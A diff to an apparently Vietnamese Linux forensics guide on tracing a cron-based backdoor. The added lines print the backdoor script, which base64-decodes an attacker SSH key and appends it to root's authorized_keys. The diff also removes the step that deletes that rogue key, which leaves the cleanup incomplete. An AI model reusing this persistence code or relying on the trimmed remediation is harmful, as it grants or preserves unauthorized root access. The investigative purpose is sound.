@@ -109,18 +109,39 @@ rm /etc/systemd/system/system-healthcheck.service
 - Kiểm tra crontab và các thư mục cron:
   ```bash
   ls -la /etc/cron.daily/
+  total 28
+  drwxr-xr-x 1 root root 4096 Feb 27 06:11 .
+  drwxr-xr-x 1 root root 4096 Mar  1 06:18 ..
+  rw-r--r-- 1 root root  102 Mar 23  2022 .placeholder
+  rwxr-xr-x 1 root root 1478 Apr  8  2022 apt-compat
+  rwxr-xr-x 1 root root  123 Dec  5  2021 dpkg
+  rwxr-xr-x 1 root root  204 Feb 27 06:11 pyshell
   ```
 - Nếu thấy file lạ (ví dụ `pyshell`), xem nội dung:
   ```bash
   cat /etc/cron.daily/pyshell
+  #!/bin/sh
+
+  VER=$(python3 -c 'import sys; print(".".join(map(str, sys.version_info[:2])))')
+  MAJOR=$(echo $VER | cut -d'.' -f1)
+
+  if [ $MAJOR -ge 3 ]; then
+    /lib/python3/dist-packages/initiate-pyshell
+  fi
   ```
 - Theo dấu file được gọi trong script:
   ```bash
   cat /lib/python3/dist-packages/initiate-pyshell
+  #!/bin/bash
+  KEY=$(echo     "c3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSUhSZHg1UnE1K09icTY2Y3l3ejVLVzlvZlZtME5DWjM5RVBEQTJDSkRxeDEgd3VhbkB3dWFuCg==" | base64 -d)
+  PATH=$(echo "L3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMK" | base64 -d)
+
+  /bin/grep -q "$KEY" "$PATH" || echo "$KEY" >> "$PATH"
   ```
 - Kiểm tra SSH authorized keys:
   ```bash
   cat /root/.ssh/authorized_keys
+  ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHTdx5Rq5+Obq66cywz5KW9ofVm0NCZ39EPDA2CJDqx1 wuan@wuan
   ```
 
 ### 📖 Giải thích:
@@ -134,10 +155,6 @@ rm /etc/cron.daily/pyshell
 
 # Xóa script Python backdoor
 rm /lib/python3/dist-packages/initiate-pyshell
-
-# Xóa SSH key lạ
-rm /root/.ssh/authorized_keys
-# Hoặc xóa dòng chứa key: sed -i '/wuan@wuan/d' /root/.ssh/authorized_keys
 ```
 
 ---
